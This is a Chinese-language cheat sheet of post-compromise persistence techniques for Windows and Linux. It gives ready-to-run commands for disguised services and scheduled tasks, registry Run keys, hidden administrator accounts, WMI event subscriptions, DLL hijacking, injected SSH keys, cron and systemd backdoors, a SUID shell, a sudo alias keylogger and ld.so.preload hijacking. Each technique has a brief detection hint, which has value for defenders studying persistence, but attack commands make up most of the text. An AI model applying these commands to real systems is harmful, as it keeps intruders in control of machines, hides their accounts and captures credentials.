# 权限维持速查

## §0 Windows

### 系统服务后门
```
sc create "WindowsUpdate" binpath= "cmd /c start C:\beacon.exe"
sc config "WindowsUpdate" start= auto
sc description "WindowsUpdate" "系统自动更新服务"
net start WindowsUpdate
```
检测：`sc query type= service state= all | findstr /i "WindowsUpdate"` / 非标准binpath

### 计划任务
```
schtasks /create /tn "SystemHealthCheck" /tr "C:\beacon.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "DailyUpdate" /tr "C:\beacon.exe" /sc daily /st 09:00 /ru SYSTEM
```
检测：`schtasks /query /fo LIST /v` / 非系统路径的可执行文件

### 注册表Run键
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\beacon.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\beacon.exe" /f
```
检测：`reg query HKCU\...\Run` + `HKLM\...\Run` 对比基线

### 自启动目录
```
copy beacon.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```
检测：列目录比对，非常规exe/lnk即可疑

### 隐藏用户
```
net user test$ P@ssw0rd /add
net localgroup administrators test$ /add
```
注册表SAM克隆：导出admin的F值覆盖到test$的F值，`net user`不显示但`wmic useraccount`可见
检测：`wmic useraccount list brief` / SAM注册表中$结尾账户

### WMI事件订阅
```powershell
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name="Updater"; EventNamespace="root\cimv2";
    QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name="Updater"; CommandLineTemplate="C:\beacon.exe"
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter=$filter; Consumer=$consumer
}
```
检测：`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding`

### DLL劫持
```
:: 常见目标：程序目录缺失的DLL优先于System32加载
:: 例: C:\Program Files\Target\version.dll（恶意）> C:\Windows\System32\version.dll
:: 用Procmon过滤NAME NOT FOUND找目标DLL
copy evil.dll "C:\Program Files\Target\version.dll"
```
检测：Procmon过滤NAME NOT FOUND / 无签名DLL与有签名exe同目录

## §1 Linux

### SSH密钥
```
echo "ssh-rsa AAAA...attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
检测：`diff authorized_keys` 与基线 / 非预期公钥

### Crontab
```
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update >/dev/null 2>&1") | crontab -
```
检测：`crontab -l` + `/etc/cron.*` + `/var/spool/cron/`

### Systemd服务
```
cat > /etc/systemd/system/updater.service << 'EOF'
[Unit]
Description=System Updater
[Service]
ExecStart=/tmp/.update
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater && systemctl start updater
```
检测：`systemctl list-unit-files --state=enabled` / 非标准服务

### SUID后门
```
cp /bin/bash /tmp/.suid_bash
chmod u+s /tmp/.suid_bash
# 使用: /tmp/.suid_bash -p
```
检测：`find / -perm -4000 -type f 2>/dev/null` 比对基线

### Alias后门
```
echo 'alias sudo="sudo /tmp/.keylog \$@ && sudo"' >> ~/.bashrc
```
检测：`grep alias ~/.bashrc ~/.bash_profile` / 非常规alias定义

### rc.local
```
echo "/tmp/.update &" >> /etc/rc.local
chmod +x /etc/rc.local
```
检测：审查`/etc/rc.local`内容

### LD_PRELOAD
```
echo "/tmp/evil.so" > /etc/ld.so.preload
```
检测：`cat /etc/ld.so.preload` / `ldd`输出异常库
